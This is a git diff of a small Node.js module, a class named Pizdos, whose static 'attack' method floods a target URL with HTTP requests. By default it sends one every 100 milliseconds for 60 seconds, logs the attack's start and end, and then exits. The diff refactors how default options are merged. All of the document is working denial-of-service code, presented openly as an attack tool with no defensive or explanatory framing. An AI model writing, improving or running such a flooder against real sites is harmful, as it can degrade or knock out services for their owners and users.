@@ -1,10 +1,8 @@
 // ---------------------------- Imports. ---------------------------------
-const fs      = require('fs'),
-      cp      = require('child_process'),
-      request = require('request')
+const request = require('request')
 
 // --------------------------- Main class. -------------------------------
-class Pizdos {
+module.exports = class Pizdos {
     // Public.
     /**
      * Starts attack on url using options.
@@ -12,42 +10,32 @@ class Pizdos {
      * @param {Object} options 
      */
     static attack(url, options) {
-        fs.readFile(__dirname + '/../config/standart-options.json',
-                    'utf8',
-                    (error, data) => {
-            if (error) throw error
-            
-            for (parameter in options) {
-                if (isNaN(Number(options[parameter]))) {
-                    throw `Parameter ${parameter} is incorrect.`
-                }
-            }
+        options = Object.assign(this.standardOptions, options)
 
-            this.startAttack(url, Object.assign(JSON.parse(data), options))
-        })
-    }
-
-    // Private.
-    /**
-     * Starts attack on url.
-     * @param {string} url
-     * @param {Object} options
-     */
-    static startAttack(url, options) {
-        console.log('Attack is started.')
-
+        options.log(`Attack started at ${new Date}.`)
+        
         setInterval(() => {
             request(url, (error) => {
                 if (error) throw 'Attack ended with an error.\n' + error
             })
         }, options.frequency)
-
+        
         setTimeout(() => {
-            console.log('Attack is complete.')
+            options.log(`Attack complete at ${new Date}.`)
             process.exit(0)
         }, options.duration)
     }
-}
 
-// ---------------------------- Exports. ---------------------------------
-module.exports = Pizdos
+    // Private.
+    /**
+     * Constant with standard options.
+     */
+    static get standardOptions() {
+        return {
+            duration: 60000,
+            frequency: 100,
+            log: console.log
+        }
+    }
+}
+ 
